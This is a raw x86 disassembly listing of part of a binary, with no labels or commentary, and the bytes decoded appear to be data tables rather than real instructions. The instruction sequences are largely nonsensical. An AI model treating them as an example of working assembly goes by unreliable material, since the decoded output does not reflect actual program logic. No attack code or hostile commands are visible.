  408233:	00 7e 00             	add    %bh,0x0(%esi)
  408236:	c2 23 00             	ret    $0x23
  408239:	00 00                	add    %al,(%eax)
  40823b:	00 e1                	add    %ah,%cl
  40823d:	01 90 09 9e 00 7e    	add    %edx,0x7e009e09(%eax)
  408243:	00 00                	add    %al,(%eax)
  408245:	00 01                	add    %al,(%ecx)
  408247:	00 d6                	add    %dl,%dh
  408249:	16                   	push   %ss
  40824a:	02 00                	add    (%eax),%al
  40824c:	02 00                	add    (%eax),%al
  40824e:	32 0d 02 00 03 00    	xor    0x30002,%cl
  408254:	74 11                	je     0x408267
  408256:	00 00                	add    %al,(%eax)
  408258:	01 00                	add    %eax,(%eax)
  40825a:	d6                   	salc
  40825b:	16                   	push   %ss
  40825c:	00 00                	add    %al,(%eax)
  40825e:	02 00                	add    (%eax),%al
  408260:	0e                   	push   %cs
  408261:	13 00                	adc    (%eax),%eax
  408263:	00 03                	add    %al,(%ebx)
  408265:	00 59 0d             	add    %bl,0xd(%ecx)
  408268:	00 00                	add    %al,(%eax)
  40826a:	04 00                	add    $0x0,%al
  40826c:	fd                   	std
  40826d:	12 00                	adc    (%eax),%al
  40826f:	00 05 00 44 0d 02    	add    %al,0x20d4400
  408275:	00 06                	add    %al,(%esi)
  408277:	00 cd                	add    %cl,%ch
  408279:	0c 00                	or     $0x0,%al
  40827b:	00 01                	add    %al,(%ecx)
  40827d:	00 d6                	add    %dl,%dh
  40827f:	16                   	push   %ss
  408280:	00 00                	add    %al,(%eax)
  408282:	02 00                	add    (%eax),%al
  408284:	31 13                	xor    %edx,(%ebx)
  408286:	00 00                	add    %al,(%eax)
  408288:	03 00                	add    (%eax),%eax
  40828a:	72 0e                	jb     0x40829a
  40828c:	00 00                	add    %al,(%eax)
  40828e:	04 00                	add    $0x0,%al
  408290:	3e 13 00             	adc    %ds:(%eax),%eax
  408293:	00 05 00 85 0e 00    	add    %al,0xe8500
  408299:	00 06                	add    %al,(%esi)
  40829b:	00 74 11 02          	add    %dh,0x2(%ecx,%edx,1)
  40829f:	00 07                	add    %al,(%edi)
  4082a1:	00 21                	add    %ah,(%ecx)
  4082a3:	0d 00 00 08 00       	or     $0x80000,%eax
  4082a8:	21 13                	and    %edx,(%ebx)
  4082aa:	00 00                	add    %al,(%eax)
  4082ac:	01 00                	add    %eax,(%eax)
  4082ae:	b4 15                	mov    $0x15,%ah
  4082b0:	00 00                	add    %al,(%eax)
  4082b2:	02 00                	add    (%eax),%al
  4082b4:	88 15 00 00 01 00    	mov    %dl,0x10000
  4082ba:	9e                   	sahf
  4082bb:	0f 00 00             	sldt   (%eax)
  4082be:	01 00                	add    %eax,(%eax)
  4082c0:	76 13                	jbe    0x4082d5
  4082c2:	00 00                	add    %al,(%eax)
  4082c4:	01 00                	add    %eax,(%eax)
  4082c6:	76 13                	jbe    0x4082db
  4082c8:	00 00                	add    %al,(%eax)
  4082ca:	02 00                	add    (%eax),%al
  4082cc:	70 0d                	jo     0x4082db
  4082ce:	00 00                	add    %al,(%eax)
  4082d0:	01 00                	add    %eax,(%eax)
  4082d2:	4b                   	dec    %ebx
  4082d3:	14 00                	adc    $0x0,%al
  4082d5:	00 01                	add    %al,(%ecx)
  4082d7:	00 c4                	add    %al,%ah
  4082d9:	12 00                	adc    (%eax),%al
  4082db:	00 02                	add    %al,(%edx)
  4082dd:	00 e8                	add    %ch,%al
  4082df:	15 00 00 01 00       	adc    $0x10000,%eax
  4082e4:	a0 09 00 00 01       	mov    0x1000009,%al
  4082e9:	00 67 06             	add    %ah,0x6(%edi)
  4082ec:	00 00                	add    %al,(%eax)
  4082ee:	02 00                	add    (%eax),%al
  4082f0:	71 1a                	jno    0x40830c
  4082f2:	00 00                	add    %al,(%eax)
  4082f4:	01 00                	add    %eax,(%eax)
  4082f6:	67 06                	addr16 push %es
  4082f8:	00 00                	add    %al,(%eax)
  4082fa:	02 00                	add    (%eax),%al
  4082fc:	71 1a                	jno    0x408318
  4082fe:	00 00                	add    %al,(%eax)
  408300:	01 00                	add    %eax,(%eax)
  408302:	1c 10                	sbb    $0x10,%al
  408304:	00 00                	add    %al,(%eax)
  408306:	02 00                	add    (%eax),%al
  408308:	f1                   	int1
  408309:	13 00                	adc    (%eax),%eax
  40830b:	00 01                	add    %al,(%ecx)
  40830d:	00 67 06             	add    %ah,0x6(%edi)
  408310:	00 00                	add    %al,(%eax)
  408312:	01 00                	add    %eax,(%eax)
  408314:	18 08                	sbb    %cl,(%eax)
  408316:	00 00                	add    %al,(%eax)
  408318:	01 00                	add    %eax,(%eax)
  40831a:	16                   	push   %ss
  40831b:	01 00                	add    %eax,(%eax)
  40831d:	00 01                	add    %al,(%ecx)
  40831f:	00 4b 14             	add    %cl,0x14(%ebx)
  408322:	00 00                	add    %al,(%eax)
  408324:	01 00                	add    %eax,(%eax)
  408326:	4b                   	dec    %ebx
  408327:	14 00                	adc    $0x0,%al
  408329:	00 02                	add    %al,(%edx)
  40832b:	00 67 06             	add    %ah,0x6(%edi)
  40832e:	00 00                	add    %al,(%eax)
  408330:	01 00                	add    %eax,(%eax)
  408332:	4b                   	dec    %ebx
  408333:	14 00                	adc    $0x0,%al
  408335:	00 01                	add    %al,(%ecx)
  408337:	00 4b 14             	add    %cl,0x14(%ebx)
  40833a:	00 00                	add    %al,(%eax)
  40833c:	02 00                	add    (%eax),%al
  40833e:	67 06                	addr16 push %es
  408340:	00 00                	add    %al,(%eax)
  408342:	01 00                	add    %eax,(%eax)
  408344:	31 08                	xor    %ecx,(%eax)
  408346:	00 00                	add    %al,(%eax)
  408348:	01 00                	add    %eax,(%eax)
  40834a:	a0 09 00 00 01       	mov    0x1000009,%al
  40834f:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408355:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  40835b:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408361:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408367:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  40836d:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408373:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408379:	00 db                	add    %bl,%bl
  40837b:	01 00                	add    %eax,(%eax)
  40837d:	00 02                	add    %al,(%edx)
  40837f:	00 a7 02 00 00 03    	add    %ah,0x3000002(%edi)
  408385:	00 73 18             	add    %dh,0x18(%ebx)
  408388:	00 00                	add    %al,(%eax)
  40838a:	01 00                	add    %eax,(%eax)
  40838c:	e2 0e                	loop   0x40839c
  40838e:	00 00                	add    %al,(%eax)
  408390:	02 00                	add    (%eax),%al
  408392:	38 17                	cmp    %dl,(%edi)
  408394:	00 00                	add    %al,(%eax)
  408396:	01 00                	add    %eax,(%eax)
  408398:	20 08                	and    %cl,(%eax)
  40839a:	00 00                	add    %al,(%eax)
  40839c:	01 00                	add    %eax,(%eax)
  40839e:	e0 09                	loopne 0x4083a9
  4083a0:	00 00                	add    %al,(%eax)
  4083a2:	02 00                	add    (%eax),%al
  4083a4:	b8 07 10 10 03       	mov    $0x3101007,%eax
  4083a9:	00 39                	add    %bh,(%ecx)
  4083ab:	17                   	pop    %ss
  4083ac:	00 00                	add    %al,(%eax)
  4083ae:	01 00                	add    %eax,(%eax)
  4083b0:	67 06                	addr16 push %es
  4083b2:	00 00                	add    %al,(%eax)
  4083b4:	01 00                	add    %eax,(%eax)
  4083b6:	db 01                	fildl  (%ecx)
  4083b8:	00 00                	add    %al,(%eax)
  4083ba:	02 00                	add    (%eax),%al
  4083bc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4083bd:	02 00                	add    (%eax),%al
  4083bf:	00 01                	add    %al,(%ecx)
  4083c1:	00 28                	add    %ch,(%eax)
  4083c3:	16                   	push   %ss
  4083c4:	00 00                	add    %al,(%eax)
  4083c6:	01 00                	add    %eax,(%eax)
  4083c8:	e0 09                	loopne 0x4083d3
  4083ca:	10 10                	adc    %dl,(%eax)
  4083cc:	02 00                	add    (%eax),%al
  4083ce:	bb 07 00 00 01       	mov    $0x1000007,%ebx
  4083d3:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4083d9:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4083df:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4083e5:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4083eb:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  4083f1:	00 6c 17 00          	add    %ch,0x0(%edi,%edx,1)
  4083f5:	00 02                	add    %al,(%edx)
  4083f7:	00 4e 1a             	add    %cl,0x1a(%esi)
  4083fa:	00 00                	add    %al,(%eax)
  4083fc:	01 00                	add    %eax,(%eax)
  4083fe:	80 0d 00 00 01 00 80 	orb    $0x80,0x10000
  408405:	0d 00 00 01 00       	or     $0x10000,%eax
  40840a:	db 01                	fildl  (%ecx)
  40840c:	00 00                	add    %al,(%eax)
  40840e:	02 00                	add    (%eax),%al
  408410:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  408411:	02 00                	add    (%eax),%al
  408413:	00 01                	add    %al,(%ecx)
  408415:	00 67 06             	add    %ah,0x6(%edi)
  408418:	00 00                	add    %al,(%eax)
  40841a:	01 00                	add    %eax,(%eax)
  40841c:	95                   	xchg   %eax,%ebp
  40841d:	15 00 00 02 00       	adc    $0x20000,%eax
  408422:	75 17                	jne    0x40843b
  408424:	00 00                	add    %al,(%eax)
  408426:	01 00                	add    %eax,(%eax)
  408428:	67 06                	addr16 push %es
  40842a:	00 00                	add    %al,(%eax)
  40842c:	01 00                	add    %eax,(%eax)
  40842e:	67 06                	addr16 push %es
  408430:	10 10                	adc    %dl,(%eax)
  408432:	02 00                	add    (%eax),%al
  408434:	75 17                	jne    0x40844d
  408436:	00 00                	add    %al,(%eax)
  408438:	01 00                	add    %eax,(%eax)
  40843a:	67 06                	addr16 push %es
  40843c:	00 00                	add    %al,(%eax)
  40843e:	01 00                	add    %eax,(%eax)
  408440:	28 16                	sub    %dl,(%esi)
  408442:	00 00                	add    %al,(%eax)
  408444:	01 00                	add    %eax,(%eax)
  408446:	a0 09 00 00 01       	mov    0x1000009,%al
  40844b:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408451:	00 6a 06             	add    %ch,0x6(%edx)
  408454:	00 00                	add    %al,(%eax)
  408456:	01 00                	add    %eax,(%eax)
  408458:	a0 09 00 00 01       	mov    0x1000009,%al
  40845d:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408463:	00 e8                	add    %ch,%al
  408465:	15 00 00 01 00       	adc    $0x10000,%eax
  40846a:	28 08                	sub    %cl,(%eax)
  40846c:	00 00                	add    %al,(%eax)
  40846e:	01 00                	add    %eax,(%eax)
  408470:	c4 12                	les    (%edx),%edx
  408472:	00 00                	add    %al,(%eax)
  408474:	02 00                	add    (%eax),%al
  408476:	83 0d 00 00 01 00 e8 	orl    $0xffffffe8,0x10000
  40847d:	15 00 00 01 00       	adc    $0x10000,%eax
  408482:	a0 09 00 00 01       	mov    0x1000009,%al
  408487:	00 bd 18 00 00 01    	add    %bh,0x1000018(%ebp)
  40848d:	00 3f                	add    %bh,(%edi)
  40848f:	0c 00                	or     $0x0,%al
  408491:	00 01                	add    %al,(%ecx)
  408493:	00 3f                	add    %bh,(%edi)
  408495:	0c 00                	or     $0x0,%al
  408497:	20 00                	and    %al,(%eax)
  408499:	00 00                	add    %al,(%eax)
  40849b:	00 00                	add    %al,(%eax)
  40849d:	00 01                	add    %al,(%ecx)
  40849f:	00 c8                	add    %cl,%al
  4084a1:	07                   	pop    %es
  4084a2:	00 00                	add    %al,(%eax)
  4084a4:	02 00                	add    (%eax),%al
  4084a6:	93                   	xchg   %eax,%ebx
  4084a7:	19 00                	sbb    %eax,(%eax)
  4084a9:	00 03                	add    %al,(%ebx)
  4084ab:	00 73 18             	add    %dh,0x18(%ebx)
  4084ae:	00 00                	add    %al,(%eax)
  4084b0:	01 00                	add    %eax,(%eax)
  4084b2:	c8 07 00 00          	enter  $0x7,$0x0
  4084b6:	01 00                	add    %eax,(%eax)
  4084b8:	c8 07 02 00          	enter  $0x207,$0x0
  4084bc:	02 00                	add    (%eax),%al
  4084be:	46                   	inc    %esi
  4084bf:	07                   	pop    %es
  4084c0:	00 00                	add    %al,(%eax)
  4084c2:	01 00                	add    %eax,(%eax)
  4084c4:	b1 0e                	mov    $0xe,%cl
  4084c6:	00 00                	add    %al,(%eax)
  4084c8:	01 00                	add    %eax,(%eax)
  4084ca:	fd                   	std
  4084cb:	16                   	push   %ss
  4084cc:	00 00                	add    %al,(%eax)
  4084ce:	01 00                	add    %eax,(%eax)
  4084d0:	3a 0e                	cmp    (%esi),%cl
  4084d2:	00 00                	add    %al,(%eax)
  4084d4:	01 00                	add    %eax,(%eax)
  4084d6:	e3 0e                	jecxz  0x4084e6
  4084d8:	00 00                	add    %al,(%eax)
  4084da:	02 00                	add    (%eax),%al
  4084dc:	75 1a                	jne    0x4084f8
  4084de:	10 10                	adc    %dl,(%eax)
  4084e0:	03 00                	add    (%eax),%eax
  4084e2:	e0 09                	loopne 0x4084ed
  4084e4:	10 10                	adc    %dl,(%eax)
  4084e6:	04 00                	add    $0x0,%al
  4084e8:	19 06                	sbb    %eax,(%esi)
  4084ea:	10 10                	adc    %dl,(%eax)
  4084ec:	05 00 39 17 00       	add    $0x173900,%eax
  4084f1:	00 01                	add    %al,(%ecx)
  4084f3:	00 4c 0e 00          	add    %cl,0x0(%esi,%ecx,1)
  4084f7:	00 01                	add    %al,(%ecx)
  4084f9:	00 4c 0e 10          	add    %cl,0x10(%esi,%ecx,1)
  4084fd:	10 02                	adc    %al,(%edx)
  4084ff:	00 3b                	add    %bh,(%ebx)
  408501:	09 00                	or     %eax,(%eax)
  408503:	00 01                	add    %al,(%ecx)
  408505:	00 4c 0e 10          	add    %cl,0x10(%esi,%ecx,1)
  408509:	10 02                	adc    %al,(%edx)
  40850b:	00 3b                	add    %bh,(%ebx)
  40850d:	09 00                	or     %eax,(%eax)
  40850f:	00 01                	add    %al,(%ecx)
  408511:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408517:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  40851d:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408523:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408529:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  40852f:	00 a0 09 00 00 01    	add    %ah,0x1000009(%eax)
  408535:	00 a0 09 04 00 1d    	add    %ah,0x1d000409(%eax)
  40853b:	00 07                	add    %al,(%edi)
  40853d:	00 1d 00 08 00 1d    	add    %bl,0x1d000800
  408543:	00 09                	add    %cl,(%ecx)
  408545:	00 1d 00 0a 00 1d    	add    %bl,0x1d000a00
  40854b:	00 0b                	add    %cl,(%ebx)
  40854d:	00 1d 00 0c 00 1d    	add    %bl,0x1d000c00
  408553:	00 0d 00 1d 00 0e    	add    %cl,0xe001d00
  408559:	00 1d 00 10 00 1d    	add    %bl,0x1d001000
  40855f:	00 11                	add    %dl,(%ecx)
  408561:	00 1d 00 12 00 1d    	add    %bl,0x1d001200
  408567:	00 13                	add    %dl,(%ebx)
  408569:	00 1d 00 14 00 1d    	add    %bl,0x1d001400
  40856f:	00 17                	add    %dl,(%edi)
  408571:	00 1d 00 18 00 1d    	add    %bl,0x1d001800
  408577:	00 1a                	add    %bl,(%edx)
  408579:	00 1d 00 1b 00 1d    	add    %bl,0x1d001b00
  40857f:	00 1d 00 1d 00 22    	add    %bl,0x22001d00
  408585:	00 1d 00 23 00 1d    	add    %bl,0x1d002300
  40858b:	00 25 00 1d 00 26    	add    %ah,0x26001d00
  408591:	00 1d 00 28 00 1d    	add    %bl,0x1d002800
  408597:	00 29                	add    %ch,(%ecx)
  408599:	00 1d 00 2a 00 1d    	add    %bl,0x1d002a00
  40859f:	00 39                	add    %bh,(%ecx)
  4085a1:	00 63 19             	add    %ah,0x19(%ebx)
  4085a4:	52                   	push   %edx
  4085a5:	00 39                	add    %bh,(%ecx)
  4085a7:	00 90 09 9e 00 d9    	add    %dl,-0x26ff61f7(%eax)
  4085ad:	00 88 14 48 01 e1    	add    %cl,-0x1efeb7ec(%eax)
  4085b3:	00 88 14 52 00 e9    	add    %cl,-0x16ffadec(%eax)
  4085b9:	00 88 14 04 03 f9    	add    %cl,-0x6fcfbec(%eax)
  4085bf:	00 88 14 03 02 01    	add    %cl,0x1020314(%eax)
  4085c5:	01 88 14 03 02 09    	add    %ecx,0x9020314(%eax)
  4085cb:	01 88 14 03 02 11    	add    %ecx,0x11020314(%eax)
  4085d1:	01 88 14 03 02 19    	add    %ecx,0x19020314(%eax)
  4085d7:	01 88 14 03 02 21    	add    %ecx,0x21020314(%eax)
  4085dd:	01 88 14 03 02 29    	add    %ecx,0x29020314(%eax)
  4085e3:	01 88 14 03 02 31    	add    %ecx,0x31020314(%eax)
  4085e9:	01 88 14 51 03 39    	add    %ecx,0x39035114(%eax)
  4085ef:	01 88 14 03 02 41    	add    %ecx,0x41020314(%eax)
  4085f5:	01 88 14 03 02 49    	add    %ecx,0x49020314(%eax)
  4085fb:	01 88 14 03 02 51    	add    %ecx,0x51020314(%eax)
  408601:	01 88 14 d7 03 61    	add    %ecx,0x6103d714(%eax)
  408607:	01 88 14 52 00 69    	add    %ecx,0x69005214(%eax)
  40860d:	01 88 14 52 00 79    	add    %ecx,0x79005214(%eax)
  408613:	01 88 14 15 09 81    	add    %ecx,-0x7ef6eaec(%eax)
  408619:	01 7e 0d             	add    %edi,0xd(%esi)
  40861c:	1a 09                	sbb    (%ecx),%cl
  40861e:	09 00                	or     %eax,(%eax)
  408620:	88 14 52             	mov    %dl,(%edx,%edx,2)
  408623:	00 0c 00             	add    %cl,(%eax,%eax,1)
  408626:	88 14 52             	mov    %dl,(%edx,%edx,2)
  408629:	00 89 01 2c 10 36    	add    %cl,0x36102c01(%ecx)
  40862f:	09 91 01 88 14 3c    	or     %edx,0x3c148801(%ecx)
  408635:	09 89 01 79 0c 42    	or     %ecx,0x420c7901(%ecx)
  40863b:	09 41 00             	or     %eax,0x0(%ecx)
  40863e:	25 0a 4e 09 41       	and    $0x41094e0a,%eax
  408643:	00 95 18 53 09 41    	add    %dl,0x41095318(%ebp)
  408649:	00 e8                	add    %ch,%al
  40864b:	0e                   	push   %cs
  40864c:	c2 00 29             	ret    $0x2900
  40864f:	00 c7                	add    %al,%bh
  408651:	08 08                	or     %cl,(%eax)
  408653:	02 99 01 88 14 03    	add    0x3148801(%ecx),%bl
  408659:	02 99 01 c7 08 08    	add    0x808c701(%ecx),%bl
  40865f:	02 a1 01 2f 1b 60    	add    0x601b2f01(%ecx),%ah
  408665:	09 19                	or     %ebx,(%ecx)
  408667:	00 96 1a 66 09 14    	add    %dl,0x1409661a(%esi)
  40866d:	00 11                	add    %dl,(%ecx)
  40866f:	14 8f                	adc    $0x8f,%al
  408671:	09 1c 00             	or     %ebx,(%eax,%eax,1)
  408674:	a8 07                	test   $0x7,%al
  408676:	29 01                	sub    %eax,(%ecx)
  408678:	41                   	inc    %ecx
  408679:	00 91 07 9f 09 1c    	add    %dl,0x1c099f07(%ecx)
  40867f:	00 a6 17 b5 09 c1    	add    %ah,-0x3ef64ae9(%esi)
  408685:	00 23                	add    %ah,(%ebx)
  408687:	05 ba 09 c1 00       	add    $0xc109ba,%eax
  40868c:	02 0e                	add    (%esi),%cl
  40868e:	bf 09 a9 01 67       	mov    $0x6701a909,%edi
  408693:	09 c5                	or     %eax,%ebp
  408695:	09 0c 00             	or     %ecx,(%eax,%eax,1)
  408698:	5d                   	pop    %ebp
  408699:	1a ca                	sbb    %dl,%cl
  40869b:	09 24 00             	or     %esp,(%eax,%eax,1)
  40869e:	11 14 8f             	adc    %edx,(%edi,%ecx,4)
  4086a1:	09 2c 00             	or     %ebp,(%eax,%eax,1)
  4086a4:	a8 07                	test   $0x7,%al
  4086a6:	29 01                	sub    %eax,(%ecx)
  4086a8:	2c 00                	sub    $0x0,%al
  4086aa:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4086ab:	17                   	pop    %ss
  4086ac:	b5 09                	mov    $0x9,%ch
  4086ae:	a9 01 67 09 e6       	test   $0xe6096701,%eax
  4086b3:	09 19                	or     %ebx,(%ecx)
  4086b5:	00 6f 07             	add    %ch,0x7(%edi)
  4086b8:	eb 09                	jmp    0x4086c3
  4086ba:	0c 00                	or     $0x0,%al
  4086bc:	ac                   	lods   %ds:(%esi),%al
  4086bd:	0f f2 09             	pslld  (%ecx),%mm1
  4086c0:	0c 00                	or     $0x0,%al
  4086c2:	a3 0f fa 09 19       	mov    %eax,0x1909fa0f
  4086c7:	00 cd                	add    %cl,%ch
  4086c9:	09 01                	or     %eax,(%ecx)
  4086cb:	0a b1 01 f5 07 08    	or     0x807f501(%ecx),%dh
  4086d1:	0a 09                	or     (%ecx),%cl
  4086d3:	00 cd                	add    %cl,%ch
  4086d5:	09 0f                	or     %ecx,(%edi)
  4086d7:	0a 59 01             	or     0x1(%ecx),%bl
  4086da:	d4 07                	aam    $0x7
  4086dc:	15 0a c9 01 4c       	adc    $0x4c01c90a,%eax
  4086e1:	08 1f                	or     %bl,(%edi)
  4086e3:	0a 21                	or     (%ecx),%ah
  4086e5:	00 11                	add    %dl,(%ecx)
  4086e7:	14 26                	adc    $0x26,%al
  4086e9:	0a 51 00             	or     0x0(%ecx),%dl
  4086ec:	a8 07                	test   $0x7,%al
  4086ee:	29 01                	sub    %eax,(%ecx)
  4086f0:	51                   	push   %ecx
  4086f1:	00 a6 17 52 00 59    	add    %ah,0x59005217(%esi)
  4086f7:	00 40 08             	add    %al,0x8(%eax)
  4086fa:	08 02                	or     %al,(%edx)
  4086fc:	c1 00 7f             	roll   $0x7f,(%eax)
  4086ff:	15 32 0a 59 00       	adc    $0x590a32,%eax
  408704:	e6 07                	out    %al,$0x7
  408706:	08 02                	or     %al,(%edx)
  408708:	41                   	inc    %ecx
  408709:	00 58 11             	add    %bl,0x11(%eax)
  40870c:	38 0a                	cmp    %cl,(%edx)
  40870e:	41                   	inc    %ecx
  40870f:	00 b0 17 52 00 41    	add    %dh,0x41005217(%eax)
  408715:	00 90 09 9e 00 d1    	add    %dl,-0x2eff61f7(%eax)
  40871b:	01 25 0a 51 0a f1    	add    %esp,0xf10a510a
  408721:	01 2f                	add    %ebp,(%edi)
  408723:	1a 57 0a             	sbb    0xa(%edi),%dl
  408726:	f1                   	int1
  408727:	01 60 06             	add    %esp,0x6(%eax)
  40872a:	57                   	push   %edi
  40872b:	0a f1                	or     %cl,%dh
  40872d:	01 27                	add    %esp,(%edi)
  40872f:	1a 5d 0a             	sbb    0xa(%ebp),%bl
  408732:	f1                   	int1
  408733:	01 59 06             	add    %ebx,0x6(%ecx)
  408736:	5d                   	pop    %ebp
  408737:	0a f1                	or     %cl,%dh
  408739:	01 a5 14 62 0a e1    	add    %esp,-0x1ef59dec(%ebp)
  40873f:	01 88 14 52 00 e9    	add    %ecx,-0x16ffadec(%eax)
  408745:	01 88 14 6c 0a f9    	add    %ecx,-0x6f593ec(%eax)
  40874b:	01 3e                	add    %edi,(%esi)
  40874d:	0a 79 0a             	or     0xa(%ecx),%bh
  408750:	e9 01 d2 0e 52       	jmp    0x524f5956
  408755:	00 e1                	add    %ah,%cl
  408757:	01 1f                	add    %ebx,(%edi)
  408759:	1a 5d 0a             	sbb    0xa(%ebp),%bl
  40875c:	09 02                	or     %eax,(%edx)
  40875e:	13 0a                	adc    (%edx),%ecx
  408760:	52                   	push   %edx
  408761:	00 f1                	add    %dh,%cl
  408763:	01 95 14 62 0a 34    	add    %edx,0x340a6214(%ebp)
  408769:	00 88 14 3c 09 3c    	add    %cl,0x3c093c14(%eax)
  40876f:	00 11                	add    %dl,(%ecx)
  408771:	14 8f                	adc    $0x8f,%al
  408773:	09 44 00 a8          	or     %eax,-0x58(%eax,%eax,1)
  408777:	07                   	pop    %es
  408778:	29 01                	sub    %eax,(%ecx)
  40877a:	44                   	inc    %esp
  40877b:	00 a6 17 b5 09 71    	add    %ah,0x7109b517(%esi)
  408781:	01 f9                	add    %edi,%ecx
  408783:	0d 08 02 a1 01       	or     $0x1a10208,%eax
  408788:	cf                   	iret
  408789:	16                   	push   %ss
  40878a:	0c 0b                	or     $0xb,%al
  40878c:	11 02                	adc    %eax,(%edx)
  40878e:	09 09                	or     %ecx,(%ecx)
  408790:	44                   	inc    %esp
  408791:	02 19                	add    (%ecx),%bl
  408793:	02 2a                	add    (%edx),%ch
  408795:	18 28                	sbb    %ch,(%eax)
  408797:	0b 21                	or     (%ecx),%esp
  408799:	02 c7                	add    %bh,%al
  40879b:	08 08                	or     %cl,(%eax)
  40879d:	02 29                	add    (%ecx),%ch
  40879f:	02 f9                	add    %cl,%bh
  4087a1:	0d 08 02 d1 00       	or     $0xd10208,%eax
  4087a6:	6b 16 5d             	imul   $0x5d,(%esi),%edx
  4087a9:	0b d1                	or     %ecx,%edx
  4087ab:	00 77 0f             	add    %dh,0xf(%edi)
  4087ae:	52                   	push   %edx
  4087af:	00 19                	add    %bl,(%ecx)
  4087b1:	00 ab 1a 66 09 19    	add    %ch,0x1909661a(%ebx)
  4087b7:	00 ac 10 08 02 d1 00 	add    %ch,0xd10208(%eax,%edx,1)
  4087be:	95                   	xchg   %eax,%ebp
  4087bf:	18 62 0b             	sbb    %ah,0xb(%edx)
  4087c2:	21 00                	and    %eax,(%eax)
  4087c4:	03 1a                	add    (%edx),%ebx
  4087c6:	7f 0b                	jg     0x4087d3
  4087c8:	0c 00                	or     $0x0,%al
  4087ca:	c6                   	(bad)
  4087cb:	16                   	push   %ss
  4087cc:	da 0b                	fimull (%ebx)
  4087ce:	a1 01 7b 10 e6       	mov    0xe6107b01,%eax
  4087d3:	0b 39                	or     (%ecx),%edi
  4087d5:	02 fc                	add    %ah,%bh
  4087d7:	11 fa                	adc    %edi,%edx
  4087d9:	0b 39                	or     (%ecx),%edi
  4087db:	02 1f                	add    (%edi),%bl
  4087dd:	1a 0b                	sbb    (%ebx),%cl
  4087df:	0c 39                	or     $0x39,%al
  4087e1:	02 2b                	add    (%ebx),%ch
  4087e3:	16                   	push   %ss
  4087e4:	18 0c 0c             	sbb    %cl,(%esp,%ecx,1)
  4087e7:	00 ab 0c ca 09 09    	add    %ch,0x909ca0c(%ebx)
  4087ed:	00 f9                	add    %bh,%cl
  4087ef:	0d 08 02 4c 00       	or     $0x4c0208,%eax
  4087f4:	11 14 8f             	adc    %edx,(%edi,%ecx,4)
  4087f7:	09 54 00 a8          	or     %edx,-0x58(%eax,%eax,1)
  4087fb:	07                   	pop    %es
  4087fc:	29 01                	sub    %eax,(%ecx)
  4087fe:	54                   	push   %esp
  4087ff:	00 a6 17 b5 09 5c    	add    %ah,0x5c09b517(%esi)
  408805:	00 11                	add    %dl,(%ecx)
  408807:	14 8f                	adc    $0x8f,%al
  408809:	09 64 00 a8          	or     %esp,-0x58(%eax,%eax,1)
  40880d:	07                   	pop    %es
  40880e:	29 01                	sub    %eax,(%ecx)
  408810:	64 00 a6 17 b5 09 41 	add    %ah,%fs:0x4109b517(%esi)
  408817:	02 f9                	add    %cl,%bh
  408819:	0d 08 02 a1 01       	or     $0x1a10208,%eax
  40881e:	cf                   	iret
  40881f:	16                   	push   %ss
  408820:	70 0c                	jo     0x40882e
  408822:	6c                   	insb   (%dx),%es:(%edi)
  408823:	00 88 14 52 00 6c    	add    %cl,0x6c005214(%eax)
  408829:	00 74 07 88          	add    %dh,-0x78(%edi,%eax,1)
  40882d:	0c 79                	or     $0x79,%al
  40882f:	00 25 0a 93 0c 79    	add    %ah,0x790c930a
  408835:	00 95 18 53 09 74    	add    %dl,0x74095318(%ebp)
  40883b:	00 25 0a a9 0c 74    	add    %ah,0x740ca90a
  408841:	00 95 18 53 09 74    	add    %dl,0x74095318(%ebp)
  408847:	00 e8                	add    %ch,%al
  408849:	0e                   	push   %cs
  40884a:	b7 0c                	mov    $0xc,%bh
  40884c:	89 00                	mov    %eax,(%eax)
  40884e:	83 07 29             	addl   $0x29,(%edi)
  408851:	01 7c 00 25          	add    %edi,0x25(%eax,%eax,1)
  408855:	0a a9 0c 7c 00 95    	or     -0x6aff83f4(%ecx),%ch
  40885b:	18 53 09             	sbb    %dl,0x9(%ebx)
  40885e:	7c 00                	jl     0x408860
  408860:	e8 0e b7 0c 84       	call   0x844d3f73
  408865:	00 25 0a a9 0c 84    	add    %ah,0x840ca90a
  40886b:	00 95 18 53 09 84    	add    %dl,-0x7bf6ace8(%ebp)
  408871:	00 e8                	add    %ch,%al
  408873:	0e                   	push   %cs
  408874:	b7 0c                	mov    $0xc,%bh
  408876:	21 00                	and    %eax,(%eax)
  408878:	df 1a                	fistps (%edx)
  40887a:	06                   	push   %es
  40887b:	0d 89 00 46 17       	or     $0x17460089,%eax
  408880:	0c 0d                	or     $0xd,%al
  408882:	8c 00                	mov    %es,(%eax)
  408884:	88 14 3c             	mov    %dl,(%esp,%edi,1)
  408887:	09 89 00 2a 17 25    	or     %ecx,0x25172a00(%ecx)
  40888d:	0d 94 00 88 14       	or     $0x14880094,%eax
  408892:	3c 09                	cmp    $0x9,%al
  408894:	51                   	push   %ecx
  408895:	02 e2                	add    %dl,%ah
  408897:	06                   	push   %es
  408898:	34 0d                	xor    $0xd,%al
  40889a:	79 00                	jns    0x40889c
  40889c:	91                   	xchg   %eax,%ecx
  40889d:	07                   	pop    %es
  40889e:	9f                   	lahf
  40889f:	09 89 00 0d 0a 48    	or     %ecx,0x480a0d00(%ecx)
